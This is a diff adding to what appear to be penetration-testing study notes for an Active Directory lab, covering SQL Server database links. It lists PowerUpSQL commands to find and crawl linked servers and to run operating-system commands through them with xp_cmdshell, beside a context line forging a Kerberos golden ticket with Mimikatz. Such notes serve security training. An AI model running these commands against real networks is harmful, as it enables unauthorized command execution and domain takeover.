@@ -738,3 +738,17 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - `Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose`
 - Gather Information  
   - `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
+
+- A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
+- In case of database links between SQL Servers, this is, linked SQL servers it is possible to execute stored procedures.
+- Database links work even across forest trusts.
+
+- Searching Database Links
+  - Look for links to remote servers
+  - `Get-SQLServerLink -Instance dcorp-mssql -Verbose`
+
+- Enumerating Database Links
+  - `Get SQLServerLinkCrawl -Instance dcorp-mssql -Verbose`
+
+- Executing Commands
+  - `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"`
